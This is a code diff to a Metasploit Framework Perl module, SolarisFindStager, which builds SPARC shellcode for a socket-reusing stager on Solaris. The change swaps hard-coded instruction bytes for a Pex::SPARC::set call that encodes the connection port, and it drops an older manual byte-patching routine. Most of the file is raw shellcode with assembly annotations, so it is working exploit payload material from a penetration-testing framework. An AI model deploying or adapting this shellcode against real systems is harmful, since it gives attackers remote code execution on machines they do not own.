@@ -1,5 +1,6 @@
 package Msf::PayloadComponent::SolarisFindStager;
 use strict;
+use Pex::SPARC;
 use base 'Msf::PayloadComponent::SolarisPayload';
 sub load {
   Msf::PayloadComponent::SolarisPayload->import('Msf::PayloadComponent::FindConnection');
@@ -17,10 +18,13 @@ my $info =
 
 sub SolarisPayload {
     my $self = shift;
+    my $cport = $self->GetVar('CPORT');
+
     my $hash = {
         Payload =>
-            "\x2b\x10\x50\x40".     # sethi        %hi(0x41410000), %l5
-            "\xab\x35\x60\x10".     # srl          %l5, 16, %l5
+            Pex::SPARC::set($cport ^ 4095, "l5").
+#            "\x2b\x10\x50\x40".     # sethi        %hi(0x41410000), %l5
+#            "\xab\x35\x60\x10".     # srl          %l5, 16, %l5
             "\xaa\x1d\x6f\xff".     # xor          %l5, 4095, %l5
             "\xae\x10\x24\x01".     # mov          1025, %l7
             "\x96\x10\x20\x10".     # mov          16, %o3
@@ -42,12 +46,7 @@ sub SolarisPayload {
             "\xac\x1d\x80\x16",     # xor          %l6, %l6, %l6
     };
     
-    # XXX - this is probably wrong, still need to verify
-    my $cport  = unpack('N', pack('nn', $self->GetVar('CPORT') ^ 4095, 0));
-    my $hiData = unpack('N', substr($hash->{'Payload'}, 0, 4));
-    $hiData = (($hiData >> 22) << 22) + ($cport >> 10);
-    substr($hash->{'Payload'}, 0, 4, pack('N', $hiData));
-    return $hash;  
+    return($hash);  
 };
 
 sub new {
